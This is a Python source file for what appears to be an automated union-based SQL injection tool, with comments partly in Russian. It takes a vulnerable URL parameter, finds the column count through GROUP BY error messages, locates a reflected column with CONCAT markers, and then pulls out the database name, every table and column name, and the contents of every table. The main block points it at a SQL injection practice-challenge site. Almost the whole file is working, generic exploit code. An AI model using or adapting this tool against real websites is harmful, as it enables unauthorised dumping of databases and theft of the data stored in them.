import requests
import validator.valid_checkers as valid
from bs4 import BeautifulSoup
import checker.searcher as checker
import colorama
import re
import urllib.parse
import collections

colorama.init(autoreset=True)


class Explotation:
    def __init__(self, site):
        self.site = site
        print("Checking site")
        self.is_vuln, self.msg, self.pattern, self.payload = checker.search_vuln(site, is_print=False, is_pattern=True)
        print(self.msg)
        self.site_for_req = site.split('=')
        self.nums_of_columns = None
        self.end_of_sql = None
        # self.current_database = None
        self.vuln_column_num = None

    def get_content(self, html):
        soup = BeautifulSoup(html.text, 'lxml')
        all_data = soup.find_all(self.pattern)
        results = [data for num, data in enumerate(all_data[0].contents) if num % 2 == 1]
        return results

    def manual_exploit(self):
        if self.is_vuln:
            # print(self.msg)
            while True:
                payload = input("\nEnter payload: ")
                if payload == "0":
                    exit()
                else:
                    result = valid.check_res(self.site_for_req[0] + "=" + payload)
                    if len(result) == 4:
                        msg = f'{colorama.Fore.RED}{result[2]}'
                    elif len(result) == 3:
                        msg = f'{colorama.Fore.RED}{result[-1]} return 404'
                    else:
                        msg = colorama.Fore.RED + "\n".join(self.get_content(result[0]))
                    print(msg)
        else:
            print(self.msg)

    def print_columns(self):
        if self.is_vuln:
            if self.find_payload_and_columns():
                print(f'{colorama.Fore.LIGHTMAGENTA_EX}[+] Column count: {self.nums_of_columns}')
            else:
                print(f"{colorama.Fore.RED}Nums of columns didn't find")
        else:
            print(f"{colorama.Fore.RED}Site is not vulnerability for union based SQLInj")

    def find_payload_and_columns(self):
        finded = False
        pattern = re.compile(r"Unknown column '(\d+)' in 'group statement'")
        group_msg = "GROUP BY " + ",".join([str(i) for i in range(1, 100)])
        print("Finding nums of columns...")
        payloads, comment = ["", ")"], '-- -'
        for payl in payloads:
            res = requests.get(f"{self.site_for_req[0]}=-1{self.payload + payl}{group_msg}{comment}")
            if "Unknown column " in res.text:
                self.end_of_sql = self.payload + payl
                self.nums_of_columns = int(pattern.findall(res.text)[0]) - 1
                finded = True
                break
        if self.nums_of_columns is None:
            res = requests.get(f"{self.site_for_req[0]}=-1 {group_msg}")
            if "Unknown column " in res.text:
                finded = True
                self.nums_of_columns = int(pattern.findall(res.text)[0]) - 1
                self.end_of_sql = " "
        return finded

    def find_num_vulners_of_column(self):
        if self.find_payload_and_columns():
            concat = ",".join([f"CONCAT('TIC',{i},'TOK')" for i in range(1, self.nums_of_columns + 1)])
            payload = f"-1{self.end_of_sql}union select {concat}-- -"
            res = requests.get(f"{self.site_for_req[0]}={payload}")
            self.vuln_column_num = int(re.search(r'TIC(\d{1,3})TOK', res.text).group(1))
            return True
        else:
            print("Vuln column not finded")
            return False

    def database_extractor(self):
        """
        Извлекает наименование текушей базы данных через функцию database()
        :return: функция не возвращает данные, только печатает их.
        """
        if self.find_num_vulners_of_column():
            payload = []
            for i in range(1, self.nums_of_columns + 1):
                if i == self.vuln_column_num:
                    payload.append("CONCAT('TIC',database(),'TOK')")
                else:
                    payload.append('null')
            payload = ','.join(payload)
            payload = f'=-1{self.end_of_sql}UNION SELECT {payload}-- -'
            res = requests.get(self.site_for_req[0] + payload)
            print(f"{colorama.Fore.LIGHTMAGENTA_EX}[+] Database name: " + re.findall(r'TIC(\w+)TOK', res.text)[0])
        else:
            print(colorama.Fore.RED + "Script can't find vulners column")

    # def tables_extractor(self):
    #     """
    #     Функция извлекает только имена таблиц. В фреймворке пока ни как не используется
    #     :return: возвращает None или список таблиц
    #     """
    #     if self.find_num_vulners_of_column():
    #         payload = []
    #         for i in range(1, self.nums_of_columns + 1):
    #             if i == self.vuln_column_num:
    #                 payload.append('CONCAT("TIC",(SELECT GROUP_CONCAT(table_name SEPARATOR "/") from '
    #                                'INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=database()),"TOK")')
    #             else:
    #                 payload.append('null')
    #         payload = ','.join(payload)
    #         payload = f'=-1{self.end_of_sql}UNION SELECT {payload}-- -'
    #         res = requests.get(self.site_for_req[0] + payload)
    #         try:
    #             tables_name = re.findall(r'TIC([\w/]+)TOK', res.text)[0].split('/')
    #         except IndexError:
    #             print(colorama.Fore.RED + "Can't find tables_name or error into request.")
    #             return None
    #         else:
    #             return tables_name

    def column_and_table_extractor(self):
        """
        Извлекает все таблицы и колонки в текущей базе данных.
        :return: возвращает collections.defaultdict(list) в случае успеха, либо None при неуспешном извлечении.
        """
        if self.find_num_vulners_of_column():
            payload = []
            for i in range(1, self.nums_of_columns + 1):
                if i == self.vuln_column_num:
                    payload.append(
                        'CONCAT("TIC",(SELECT GROUP_CONCAT(0x2f,table_name,0x3a,column_name) from '
                        'INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA=database()),"TOK")')
                else:
                    payload.append('null')
            payload = ','.join(payload)
            payload = f'=-1{self.end_of_sql}UNION SELECT {payload}-- -'
            res = requests.get(self.site_for_req[0] + payload)

            data_extracted = re.findall(r'TIC([\w\W]+)TOK', res.text)
            if len(data_extracted) == 0:
                print(colorama.Fore.RED + "Data not found or incorrect request")
                return None
            else:
                data_extracted = data_extracted[0][1:].replace(',', '')
                data_extracted = data_extracted.split('/')
                tables_dict = collections.defaultdict(list)
                for pair in data_extracted:
                    table_name, column_name = pair.split(':')
                    tables_dict[table_name].append(column_name)
                return tables_dict

    def data_extractor(self):
        print("Data extract process...")
        colmn_dict = self.column_and_table_extractor()
        if colmn_dict is not None:
            for table in colmn_dict.keys():
                payload = []
                all_columns = ",0x3a,".join(colmn_dict[table])
                data_payload = f'CONCAT("TIC",(SELECT GROUP_CONCAT(0x2f,{all_columns}) FROM {table}),"TOK")'
                for i in range(1, self.nums_of_columns + 1):
                    if i == self.vuln_column_num:
                        payload.append(data_payload)
                    else:
                        payload.append('null')
                payl = f'=-1{self.end_of_sql}UNION SELECT {",".join(payload)}-- -'
                res = requests.get(self.site_for_req[0] + payl)

                data_extracted = re.findall(r'TIC([\w\W]+)TOK', res.text)
                if len(data_extracted) == 0:
                    print(colorama.Fore.RED + "Data not found or incorrect request")
                else:
                    data_extracted = data_extracted[0][1:].replace(',', '')
                    data_extracted = data_extracted.split('/')
                    print(colorama.Fore.LIGHTMAGENTA_EX + "Data of table " + table + ": ")
                    [print(colorama.Fore.LIGHTMAGENTA_EX + " " * 6 + '[+] ' + data) for data in data_extracted]

    def print_extracted_colums_or_tables(self, tables=True):
        """
        Функция печатания колонок и таблиц.
        :param tables:  Если true, то выводит только таблицы. Иначе выводит таблицы с содержащимися в них колонками
        :return:
        """
        data_dict = self.column_and_table_extractor()
        if data_dict is not None:
            if tables:
                print(colorama.Fore.LIGHTMAGENTA_EX + "Tables name: ")
                [print(" " * 3 + colorama.Fore.LIGHTMAGENTA_EX + '[+] ' + table) for table in data_dict.keys()]
            else:
                for table in data_dict.keys():
                    print(colorama.Fore.LIGHTMAGENTA_EX + 'Table ' + table + ':')
                    [print(colorama.Fore.LIGHTMAGENTA_EX + " " * 7 + '[+] ' + column) for column in data_dict[table]]


if __name__ == "__main__":
    # manual_exploit('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')
    # print(find_pattern("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'"))
    # print(get_content("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"))
    Explotation('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1').data_extractor()
    # expl.print_columns()
